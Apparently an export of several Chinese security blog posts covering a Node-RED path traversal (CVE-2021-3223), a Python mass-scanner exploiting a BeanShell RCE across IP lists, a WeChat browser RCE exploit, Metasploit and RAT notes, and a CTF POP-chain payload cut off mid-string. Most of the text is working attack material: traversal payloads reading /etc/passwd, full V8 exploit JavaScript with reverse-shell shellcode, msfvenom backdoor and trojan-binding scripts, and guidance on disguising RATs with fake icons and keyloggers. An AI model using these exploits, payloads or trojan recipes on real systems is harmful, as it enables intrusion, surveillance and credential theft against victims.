title:&quot;Node-RED&quot;\n\n全球分布情况：\n\n全球TOP10：\n\n我国保有量位列第4，所以影响还是很大的。设备数达到了6000以上。\nPOCip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2fsettings.js\n\n尝试获取用户名和密码：\n\n当然也可以去尝试获取系统文件\nexp：\nip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2f..%2f&#x2F;etc&#x2F;passwd\n\n\n防护方案1、更新Node-RED-Dashboard到2.26.2版本以上，可以有效防止这个漏洞。\n批量验证脚本另外针对此漏洞的批量化利用脚本也已经在今天写好了，后续将会同步到之前的Github仓库中，仓库地址为A1andNS/auto_vuln_test_script: There are some Vuln POC auto test scripts based on python3 by A1andNS (github.com)\n参考相关链接[1] https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication\n[2] https://cve.circl.lu/cve/CVE-2021-3223\n[3] https://mp.weixin.qq.com/s/ZpmhBzgqL6QqHXkDBHOH5w\n","slug":"Node-RED任意文件读取漏洞CVE-2021-3223","date":"2021-08-08T14:17:23.000Z","categories_index":"漏洞复现","tags_index":"漏洞复现,任意文件","author_index":"A1andNS"},{"id":"e6b5962f5d28325c61e84557aeb38a78","title":"自动化漏洞测试的小尝试","content":"最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利用自动化脚本去批量攻击获取flag，然后批量上交，这方面来说和下面的自动化脚本时异曲同工之妙啊。\n\n\n\n\n\n\n\n\n\n声明：本文中的自动化脚本仅供学习和安全研究，禁止利用该工具非法攻击他人网站。本人不承担任何后果。\n挖掘事件型漏洞的前期准备对于原创型漏洞我们需要做的更多是代码审计，而对于挖掘事件型漏洞那就需要我们提前准备一些工具或收集一些信息了。\n\n收集一些0Day或者NDay漏洞的EXP和POC\n合理利用网络安全搜索引擎来收集信息，例如FOFA、360网络空间探测平台、ZoomEyes等等\n\n收集EXP和POC关于EXP和POC的收集，这个就需要大家经常关注一些漏洞信息平台了，这样可以帮助我们去寻找一些新的漏洞，更是方便寻找漏洞编号，以便于我们寻找EXP和POC。\n这里说几个我知道的漏洞信息共享平台：CNNVD国家信息安全漏洞库、安全客漏洞平台、seebug平台、美国国家信息安全漏洞库、国家工控漏洞库\n\n\n\n\n\n\n\n\n\nCNNVD：http://www.cnnvd.org.cn/\n安全客：https://www.anquanke.com/vul\nseebug：https://www.seebug.org/\n美国信安库：https://nvd.nist.gov/\n国家工控漏洞库：http://ics.cnvd.org.cn/\n以上这些是漏洞库信息，找到一个漏洞，并且想要深入了解一下其如何利用，这时候就要多逛，攻防社区、安全媒体等，例如FREEBUF、安全客、嘶吼、奇安信攻防社区、先知社区等了\n最后POC和EXP，通过上面的安全媒体和攻防社区，大多数的POC和EXP我们都可以获取，但是还是无法获取到POC或者EXP，那么就完全可以去Github上输入相应的漏洞编号进行搜索，很有可能是可以找到相应的EXP和POC的。\n网络空间安全搜索引擎利用对于前面的EXP和POC都准备好了，那么就需要来找一下相应的目标了，这个时候就可以考虑去使用网络空间安全搜索引擎来查找运行目标组件的设备了。\n不同的网络安全搜索引擎语法略有不同，大家可以自行到相应网站了解，这里我主要用FOFA、ZoomEyes和360空间探测。使用相应语法可以搜索到运行目标组件的设备，这个时候就可以批量导出IP地址到本地，或者使用一些手法利用console来导出IP地址。这样就可以获得一个目标IP列表了，再结合我们的自动化脚本实现批量扫描。\n自动化脚本开发思路首先自动化脚本要实现的目的是什么？当然是要代替人去进行漏洞验证，所以我们需要去遍历IP URL列表，由脚本去逐一验证漏洞能否利用。\n其次自动化脚本验证后，我们想要获得什么？当然是让脚本告诉我们哪些设备存在漏洞，以及漏洞地址。那么我们就可以由脚本生成一份漏洞URL列表给我们。\n如果使用过FOFA等引擎就知道，我们一直访问的都是IP地址，而非使用域名进行访问，而提交漏洞最好还是要有一个域名，这也有利于找到服务器所属厂商。所以脚本还提供一个IP反查到域名的功能，并且在生成一份IP反查结果列表给我们。\n\n但是这还不够，导出IP地址时，我们并不知道IP是否时之前已经验证过的了，所以还应该在漏洞验证模块之前加入一个过滤器，滤除重复项目，所以需要在建立一个已扫描IP URL列表，在开始漏洞验证前去除重复IP，提高工作效率。\n实施案例-CNVD-2021-30167啥也不说，show you my code：\n# coding='utf-8'\n# author: A1andNS\nimport requests\nimport re\nfrom bs4 import BeautifulSoup\nimport time\n\nvul_url = open(\"vul_url.txt\", \"w\")\nip_reverse_result = open(\"ip_reverse_result.txt\", \"w\")\n\n\ndef get_ip_finished():\n    f2 = open(\"ip_finish.txt\",\"r\")\n    lines = f2.readlines()\n    ip_finish_list = []\n    for line in lines:\n        line = line.strip()\n        ip_finish_list.append(line)\n    f2.close()\n    return ip_finish_list\n\n\ndef get_ip():\n    f = open(\"ip.txt\", \"r\") # ip格式为 http://192.168.2.2:8090/\n    lines = f.readlines()\n    ip_list = []\n    for line in lines:\n        line = line.strip()\n        #pattern = re.compile(r':[0-9]+')\n        #if pattern.search(line):\n        #line = line.replace(\"https\", \"http\")\n        ip_list.append(line)\n    f.close()\n    return ip_list\n\n\ndef poc(ips,ipfs):\n    cmd = \"whoami\"  # command\n    headers = &#123;\n        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'\n    &#125;\n    payload = &#123;\n        \"bsh.script\": 'exec(\"'+cmd+'\")'\n    &#125;\n    for ip in ips:\n        if ip not in ipfs:\n            url = ip + \"servlet/~ic/bsh.servlet.BshServlet\"\n            try:\n                r = requests.post(url=url, data=payload, headers=headers, timeout=3)\n                if \"抱歉，您请求的页面出错啦！\" in r.text:\n                    print(url+\" 失败\")\n                    pass\n                else:\n                    html = BeautifulSoup(r.content, \"html.parser\")\n                    pre = html.find_all(\"pre\")\n                    if pre[0].text:\n                        print(url+\" \"+pre[0].text.strip())\n                        vul_url.write(url+\" \"+pre[0].text.strip()+\"\\n\")\n            except:\n                url = url.replace(\"https\",\"http\")\n                try:\n                    r = requests.post(url=url, data=payload, headers=headers, timeout=3)\n                    if \"抱歉，您请求的页面出错啦！\" in r.text:\n                        print(url+\" 失败\")\n                        pass\n                    else:\n                        html = BeautifulSoup(r.content, \"html.parser\")\n                        pre = html.find_all(\"pre\")\n                        if pre[0].text:\n                            print(url+\" \"+pre[0].text.strip())\n                            vul_url.write(url+\" \"+pre[0].text.strip()+\"\\n\")\n                except:\n                    print(url + \"无法访问\")\n                    pass\n        else:\n            print(ip+\" 已测试的重复项\")\n            pass\n    vul_url.close()\n\n\ndef search_ip(url):\n    pattern = re.compile(r'[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;')\n    ip = pattern.findall(url)\n    try:\n        return ip[0]\n    except:\n        return \"\"\n\ndef get_ip_reverse():\n    f = open(\"vul_url.txt\",\"r\")\n    lines = f.readlines()\n    for line in lines:\n        line = line.strip()\n        line_ls = line.split(\" \")\n        url = line_ls[0]\n        ip = search_ip(url)\n        if ip != \"\":\n            aizhan_reverse(ip)\n    ip_reverse_result.close()\n\ndef aizhan_reverse(ip):\n    result = ip + \" =>\"\n    url = \"https://dns.aizhan.com/\" + ip + \"/\"\n    headers = &#123;\n        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'\n    &#125;\n    try:\n        # print(url)\n        r = requests.get(url=url, headers=headers, timeout=3)\n        soup = BeautifulSoup(r.content,\"html.parser\")\n        # print(soup)\n        td = soup.find_all(name=\"td\", attrs=&#123;\"class\" :\"domain\"&#125;)\n        for i in td[1:len(td)-1]:\n            a = i.a\n            result += \" \" + str(a['href'])\n        print(result)\n        ip_reverse_result.write(result+\"\\n\")\n        time.sleep(2)\n    except Exception as e:\n        print(e)\n        print(ip+\" 发生错误\")\n\n\ndef test():\n    print(requests.get(\"https://www.8684.cn/ip\").text)\n\n\nif __name__ == \"__main__\":\n    ip_ls = get_ip()\n    ip_fls = get_ip_finished()\n    poc(ip_ls,ip_fls)\n    get_ip_reverse()\n    # print(ip_fls)\n    # test()\n\n这就是我根据上面所写的开发思路的开发结果，一个自动化漏洞验证，并且IP反查域名的脚本，他的出现确实提高了不少效率啊。\n执行结果如下：\n\n这个脚本目前我已经放在我的一个github仓库上了，以后应该还会有其他的脚本被加入进去。\n仓库地址：https://github.com/A1andNS/auto_vuln_test_script\n","slug":"自动化漏洞测试的小尝试","date":"2021-07-26T06:59:03.000Z","categories_index":"漏洞挖掘","tags_index":"漏洞挖掘,自动化","author_index":"A1andNS"},{"id":"1616535b9463aaa7ebb1eeba1c901452","title":"WeChat RCE漏洞复现","content":"前言4月份有一个Chrome的RCE 0day闹得沸沸扬扬，吓得我是赶紧就升级到了最新的Chrome，但是其实低版本Chrome也并非就非常危险，因为chrome默认开启了sandbox功能的，所以说正常情况下漏洞也无法被利用。\n紧接着Wechat RCE的消息传遍了大江南北，仔细一查看，好家伙Wechat的内置Browser是基于chromium内核的，而且居然还使用了–no-sanbox选项，关闭了其自带的沙箱功能，从而导致了这次的RCE漏洞，同理其他的产品要是使用了chromium内核同时又如同wechat一样关闭了sanbox功能，那么一样会存在RCE风险。\nWechat RCE漏洞复现下面开始复现，首先我们需要构造一个特制的web链接来让靶机访问。\nshell文件生成脚本：\narch=x86\nformat=csharp\nplatform=windows\nPORT=443\nHOST=192.168.90.124\nout=./wechatshell.txt\npaylaod=windows/meterpreter/reverse_tcp\nmsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out LHOST=$HOST LPORT=$PORT\n\n./wechat_shell.sh将生成的C#代码中的shell部分放入导index.html的shellcode中去。\nindex.html：\n&lt;script>\nENABLE_LOG = true;\nIN_WORKER = true;\n\n// run calc and hang in a loop\nvar shellcode = [0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,\n0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,\n0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,\n0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,\n0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,\n0x85,0xc9,0x74,0x3c,0x49,0x8b,0x34,0x8b,0x31,0xff,0x01,0xd6,0x31,0xc0,0xc1,\n0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,\n0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,\n0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,\n0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,\n0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,\n0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,\n0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x5a,0x7c,0x68,0x02,\n0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,\n0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,\n0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,\n0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,\n0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,\n0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,\n0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,\n0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,\n0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,\n0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,\n0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5];\n\nfunction print(data) &#123;\n&#125;\n\nvar not_optimised_out = 0;\nvar target_function = (function (value) &#123;\n    if (value == 0xdecaf0) &#123;\n        not_optimised_out += 1;\n    &#125;\n    not_optimised_out += 1;\n    not_optimised_out |= 0xff;\n    not_optimised_out *= 12;\n&#125;);\n\nfor (var i = 0; i &lt; 0x10000; ++i) &#123;\n    target_function(i);\n&#125;\n\nvar g_array;\nvar tDerivedNCount = 17 * 87481 - 8;\nvar tDerivedNDepth = 19 * 19;\n\nfunction cb(flag) &#123;\n    if (flag == true) &#123;\n        return;\n    &#125;\n    g_array = new Array(0);\n    g_array[0] = 0x1dbabe * 2;\n    return 'c01db33f';\n&#125;\n\nfunction gc() &#123;\n    for (var i = 0; i &lt; 0x10000; ++i) &#123;\n        new String();\n    &#125;\n&#125;\n\nfunction oobAccess() &#123;\n    var this_ = this;\n    this.buffer = null;\n    this.buffer_view = null;\n\n    this.page_buffer = null;\n    this.page_view = null;\n\n    this.prevent_opt = [];\n\n    var kSlotOffset = 0x1f;\n    var kBackingStoreOffset = 0xf;\n\n    class LeakArrayBuffer extends ArrayBuffer &#123;\n        constructor() &#123;\n            super(0x1000);\n            this.slot = this;\n        &#125;\n    &#125;\n\n    this.page_buffer = new LeakArrayBuffer();\n    this.page_view = new DataView(this.page_buffer);\n\n    new RegExp(&#123; toString: function () &#123; return 'a' &#125; &#125;);\n    cb(true);\n\n    class DerivedBase extends RegExp &#123;\n        constructor() &#123;\n            // var array = null;\n            super(\n                // at this point, the 4-byte allocation for the JSRegExp `this` object\n                // has just happened.\n                &#123;\n                    toString: cb\n                &#125;, 'g'\n                // now the runtime JSRegExp constructor is called, corrupting the\n                // JSArray.\n            );\n\n            // this allocation will now directly follow the FixedArray allocation\n            // made for `this.data`, which is where `array.elements` points to.\n            this_.buffer = new ArrayBuffer(0x80);\n            g_array[8] = this_.page_buffer;\n        &#125;\n    &#125;\n\n    // try&#123;\n    var derived_n = eval(`(function derived_n(i) &#123;\n        if (i == 0) &#123;\n            return DerivedBase;\n        &#125;\n\n        class DerivedN extends derived_n(i-1) &#123;\n            constructor() &#123;\n                super();\n                return;\n                $&#123;\"this.a=0;\".repeat(tDerivedNCount)&#125;\n            &#125;\n        &#125;\n\n        return DerivedN;\n    &#125;)`);\n\n    gc();\n\n    new (derived_n(tDerivedNDepth))();\n\n    this.buffer_view = new DataView(this.buffer);\n    this.leakPtr = function (obj) &#123;\n        this.page_buffer.slot = obj;\n        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);\n    &#125;\n\n    this.setPtr = function (addr) &#123;\n        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);\n    &#125;\n\n    this.read32 = function (addr) &#123;\n        this.setPtr(addr);\n        return this.page_view.getUint32(0, true, ...this.prevent_opt);\n    &#125;\n\n    this.write32 = function (addr, value) &#123;\n        this.setPtr(addr);\n        this.page_view.setUint32(0, value, true, ...this.prevent_opt);\n    &#125;\n\n    this.write8 = function (addr, value) &#123;\n        this.setPtr(addr);\n        this.page_view.setUint8(0, value, ...this.prevent_opt);\n    &#125;\n\n    this.setBytes = function (addr, content) &#123;\n        for (var i = 0; i &lt; content.length; i++) &#123;\n            this.write8(addr + i, content[i]);\n        &#125;\n    &#125;\n    return this;\n&#125;\n\nfunction trigger() &#123;\n    var oob = oobAccess();\n\n    var func_ptr = oob.leakPtr(target_function);\n    print('[*] target_function at 0x' + func_ptr.toString(16));\n\n    var kCodeInsOffset = 0x1b;\n\n    var code_addr = oob.read32(func_ptr + kCodeInsOffset);\n    print('[*] code_addr at 0x' + code_addr.toString(16));\n\n    oob.setBytes(code_addr, shellcode);\n\n    target_function(0);\n&#125;\n\ntry&#123;\n    print(\"start running\");\n    trigger();\n&#125;catch(e)&#123;\n    print(e);\n&#125;\n&lt;/script>\n\n运行网页服务，同时利用msf配置文件启动到监听模式msf -r msf_start\nmsf启动配置文件：\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\nset LHOST 192.168.90.124\nset LPORT 443\nrun\n\n发送链接给目标靶机（安装了Wechat 3.0.0）\n\n在靶机上点击访问chrome版本检测网页，可以看到一个重要的参数–no-sanbox，结合chromium版本为53，由此可以判断其存在相应的漏洞。\n\n在该客户端上访问我们构建的链接，等待网页加载完毕：\n\n回到我们的攻击机上，可以看到msf中靶机上线了，我们可以进行简单的dir目录查询。\n\n进一步我们可以查询sysinfo，查看系统信息，并且获取系统shell\n\n到这里RCE的复现就完成了，其实靶机在MSF中上线后，就可以进行很多操作了，具体操作可以自行查找MSF后渗透利用。\n参考材料https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&amp;mid=2657042035&amp;idx=1&amp;sn=311dd80bdde8a6dace3a26a225fdaa1d&amp;chksm=803fdeadb74857bb54f5049e1255b163c2b78bd5637764a4be0a6de2fd95f87e55426d5b72c5&amp;mpshare=1&amp;scene=23&amp;srcid=0424lC0UdTRxaMTABghI2ZGu&amp;sharer_sharetime=1619228320246&amp;sharer_shareid=cc636dec2a7835ac914d744a4f90d31b#rd\n","slug":"WeChat-RCE漏洞复现","date":"2021-07-17T15:45:22.000Z","categories_index":"漏洞复现","tags_index":"漏洞复现,RCE","author_index":"A1andNS"},{"id":"802434193ebbe0ac8767c7ca546461df","title":"Metasploit系列笔记","content":"Metasploit大家应该都很熟悉了，我也有用过，但是之前也就是浅薄的去学习一些简单的使用方法，并没有细致地去了解和学习这个攻击框架，现在算是补课吧，利用暑假的时间补补课吧。\nWindows 木马工具先来学习一下一个Windows木马生成工具，名字叫做quasar，他在github上有项目可以直接下载，github项目地址:https://github.com/quasar/Quasar，Windows下直接就是.exe执行文件，操作简单，生成证书后就可以打开使用了。\n打开quasar后可以生成和监听，首先来看监听，监听的话打开setting，进行设置监听端口，这个就类似于listing xxx端口了，点击开始监听就开始监听相关端口了。\n\n下面看看木马的构建，首先是basic setting可以设置tag方便标识，还可以设置mutec（用guid来表示程序）是未来防止木马进程多次启动，连接设置中设置木马连接的主机和端口。\n\n在installation设置中可以设置是否开机自启，并且可以自定义启动项名称，这里的Quasar Client Startup是默认的名称，可以自行修改。\n\n这里还有一个安装选项，选上安装选项后，点击木马后不仅会添加启动项，而且还会安装到系统中，其中选项有设置文件属性伪隐藏，类似于使用命令attrib +h xxx.exe，这将会起到隐藏文件的作用，如果需要解除隐藏则使用attrib -h xxx.exe即可。\n接下来在Assembly设置中可以选择一个伪造的图标，以便于更加具有迷惑性。\n\n在monitoring设置中还可以开启键盘按键记录功能，通过此功能可以获取被害人的输入信息，甚至获得密码等敏感信息。\n通过一些手段，将该木马程序传入被害者电脑，并且诱导被害者点击运行程序。一旦被害者点击，木马程序即开始运行并且加入自启动项。作为攻击者端，就会看到目标主机上线了，并且可以对其进行一些程序执行、文件管理、进程查看等等一系列操作。但是也有一点必须要注意，使用quasar生成的木马是基于.net 4 framework的，所以必须要拥有相关环境，才能正常运行木马，否则会报错。\n通过上面的设置我们可以伪造一个QQ样式的图标，他的欺骗性就大大提高了。\n下面进行测试，在拥有可用.net环境的Windows 10系统上进行木马测试。首先我先要把这个伪装的木马放到目标靶机上。\n\n双击运行这个人畜无害的QQ，就开始运行我们的木马了。我们也可以通过任务管理器看到这一点。\n\n再回到我们的攻击机，可以发现攻击机上已经可以，看到靶机上线了。同时我们可以看到这台靶机的相关信息，用户名计算机号，系统版本，地区都可以被看到。\n\n下面我们开始利用木马进行攻击，首先可以进行信息收集，查看详细的系统信息。\n\n可以利用文件管理器，访问目标靶机的文件系统，并且上传和下载文件，删除执行，这都是可以实现的。通过木马还可以实现更多的系统管理功能，例如系统自启动项目，任务管理器，TCP连接情况，注册表修改，关机重启，反向代理，远程程序执行等操作。\n\n\n下面重点来看一个有用的东西远程shell，命令执行真的就是爽歪歪。\n\n远程程序执行也是一个有点意思的点，再quasar中选择本地的可执行文件或者在线的可执行文件，即可在靶机上执行了。\n\n回到靶机看一下，他就已经运行起来了。\n\n并且我们还可以记录靶机用户的键盘输入信息，从而一定的课程获取敏感信息，对用户有监听作用。\n\n还可以进行图形化的远程连接，并且该连接时靶机端并不会出现异常依旧正常显示。\n\n甚至还可以弹窗信息，推送想要推送的信息。\n\n但是如何放置到目标靶机上还是有难度的，目前我想法的话，应该是要结合社会工程学手段才行，或者一些其他手段诱导下载到用户本地。\nAndroid木马工具Android木马使用AhMyth-Android-RAT项目，他的github项目地址为AhMyth/AhMyth-Android-RAT: Android Remote Administration Tool (github.com)\n该项目提供了Windows版本和Linux版本。我这里直接下载该项目的二进制版本，直接就可以使用了。\n图形化工具使用起来也是较为简单，和Windows木马工具一样上来也是设置监听的端口号时什么，默认是监听42474端口来实现的。\n\n下面来看一下简单的木马构建过程，也很简单输入IP和端口，这个和之前是一样的。然后直接点击build即可生成一个apk文件。注意：AhMyth不支持最新的JDK，所以要使用就必须要使用JDK 8才能构建木马\n\n可以在相应的路径下找到它，下面我将其安装到我的安卓模拟器上进行实验，很遗憾的是可能是由于Android SDK的原因，我的模拟器上运行该木马apk后，PC机上并没有接收到上线通知，可以说是没有成功了，但是Android系统就是如此，其为了安全性进行了严格权限管理，并且API版本众多SDK版本也众多，在实战下还是会又很大的概率遇到该问题的，这就需要具有安卓开发能力了，毕竟工具只能做到这里了。\n还可以将其隐藏到其他的应用中去，这样就可以很好的解决授权问题，因为某些软件用户一定会给予其一定的权限。虽然没有成功，但是工具确实也是好工具，值得收藏一下。\nMSF木马配置基础用法:show options展示选项。set LHOST xxx.xxx.xxx.xxx这是设置相关选项的方法。\nmsfconsole -q不带banner信息的快速启动。\n调用exploit/multi/handler模块use exploit/multi/handler\n通过set payload xxxx/xxx/xxx/来设置使用的payload\n这是msf端需要的操作。\nmsfconsole -q\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\nset LHOST 192.168.51.124\nset LPORT 4444\nrun&#x2F;exploit\nmeterpreter&gt;\n\nx86简单后门生成：\n下面使用msfvenom来生成木马\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f exe -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.exe LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444\n#其中-f format表示木马格式\n#-p为payload\n#-a 表示芯片架构\n#--platfor表示系统类型\n#-o为生成位置\n#更多的使用选项可以直接-h查看。\n\n\n在msf上使用run命令开始监听，同时把生成的木马放进靶机里运行，msf成功上线木马。\n\nMSF木马VBS配置Windows VBS脚本生成，依旧是和上面的生成方式类似。\n只有涉及到上面说过的这个-f参数也就是format，只要设置为vbs格式就ok了\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f vbs -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.vbs LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444\n\n至于想要知道各个参数有哪些个可选项，就可以利用-l命令加上选项全称来进行查询，例如这里我要知道-f参数都支持哪些就用命令msfvenom -l format来查询。\n为了方便也可以使用shell脚本来一件生成，其实本质就是把命令写成shell而已了。但是相比每次输入命令来生成，直接运行shell来生成确实是方便了不少了。\narch=x86\nformat=vbs\nplatform=windows\nPORT=4444\nHOST=192.168.3.78\nout=./meter_re_tcp_x86.vbs\npaylaod=windows/meterpreter/reverse_tcp\nmsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out LHOST=$HOST LPORT=$PORT\n\n一键就可以生成了，同时还可以配置一个文件用来一键启动MSF监听，也可以剩下非常多的重复步骤。\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\nset LHOST 192.168.3.78\nset LPORT 4444\nrun\n\n这是利用了metasploit自己提供的一个功能，可以提前将命令写入一个文件，类似与配置文件，然后使用-r命令自动加载。\n下面我们就使用上面的shell脚本先生成一个x86的vbs木马。\n\n木马生成后，还是将其放入到实验靶机上，结合msf的一键启动监听脚本来使用。\nmsfconsole -r msf_start即可启动到监听。\n\n成功到达监听处，此时和之前一样在Windows上执行vbs文件，就可以在系统上成功监听到PC的上线。并且我们可以在系统上创建文件和文件夹都是可以实现的。但是这个直接生成的vbs脚本在Windows10系统上使用Windows Defender去扫描，它居然没有报毒，但是好在执行的时候，其还是检测到了其的木马行为。所以这种直接生成的木马在实战中并不能直接使用，因为杀软会直接处理了它，所以还需要更多的加工才能够有较好的效果。\n\n现在我们回过头来看看生成的vbs脚本是如何写的。\n\n首先是这部分代码，是一个函数，可以看出主要是创建了一个XML对象，并且对默写字符串进行了一个解base64的处理，然后写入到对象数据吧。\n\n下面这部分则是另一个函数，在这个函数中，调用了上面的那个base64解码函数，对第一句的字符串进行解码，然后把解码结果写入到了一个文件并且将其保存，然后就会去执行这个文件，再将其删除。也就是说加载到内存中即删除原有木马文件。我们无法从该木马文件中直接看到恶意语句，因为其做了一个混淆的工作。\n简单的异常木马vbs文件，关注这几个点，如果它又创建写入文件并且执行，还紧跟这一个删除文件的操作，就很有可能是有问题的。\nMSF木马捆绑木马捆绑可以提升他的混淆性，被捆绑文件依旧可以正常执行，但是恶意代码也会同时执行。\n我们可以尝试使用-x参数来将恶意木马捆绑到其他文件上。稍微改一改之前的脚本。\narch&#x3D;x86\nformat&#x3D;exe\nplatform&#x3D;windows\nPORT&#x3D;4444\nHOST&#x3D;192.168.3.78\nout&#x3D;冰点下载器_3.2.16.0125_Single.exe\npaylaod&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp\nx&#x3D;&#x2F;home&#x2F;a1andns&#x2F;test&#x2F;冰点下载器_3.2.16.0125_Single.exe\n\nmsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out -x $x LHOST&#x3D;$HOST LPORT&#x3D;$PORT\n\n在kali上运行脚本来捆绑木马。\n\n将绑定的exe文件放入到虚拟机里头。\n\n在Windows运行成功上线，当原有程序并没有成功运行，怀疑是程序启动的入口被修改为了恶意木马的地址。但是因为其过于暴露，目前的杀软基本都可以成功检测出他的恶意行为。\n\nMSF木马DLLDLL是动态链接库文件，生成方式与上面相同，只需要修改format格式为dll即可生成一个dll文件。\n\n然后如何来利用dll，首先dll是不能够直接双击运行的，一般来说它是被应用程序调用的，那么如何我将其名字改为某个程序需要调用的dll名称，或者系统dll名称，那么在执行某个程序的同时就可以调用到这个恶意dll文件。亦或者使用rundll32 命令直接运行（一般来说没有人会去这么做）。\n可以使用生成的dll来替代某个应用启动需要的dll文件，就可以让木马利用更加友好\nMSF劫持DLL这就是上面说的利用生成的dll来替代某个应用启动需要的dll文件。这里可以使用一个工具名称为AheadLib，可以帮助我们进行DLL hijack，它能够根据我们需要劫持dll文件生成cpp文件，我们修改添加一个调用我们的shell.dll文件，这样就编译在替换原来的dll文件，就可以让程序调用原有名称的这个dll时去调用我们的恶意dll文件。但是这款工具有点老了似乎只能由于x86，对于64为的x64程序似乎不兼容，但是Github上目前也有一些改进版本支持了x64架构。\n\n","slug":"Metasploit系列笔记","date":"2021-07-06T15:28:43.000Z","categories_index":"学习笔记","tags_index":"MSF","author_index":"A1andNS"},{"id":"2f7fe6f4a9640694ceed20c9c2405618","title":"强网杯2021-pop链","content":"强网杯2021-pop链起初以为pop链是固定的，没有想到还是随机生成的，而且为了混淆16W行也是够狠的。\n这题后来看了题解是使用一个工具来进行pop链的寻找的，这里我用来笨办法，手动看就是废时间，还需要运气，也算是拿了个八血。\nhttp:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;: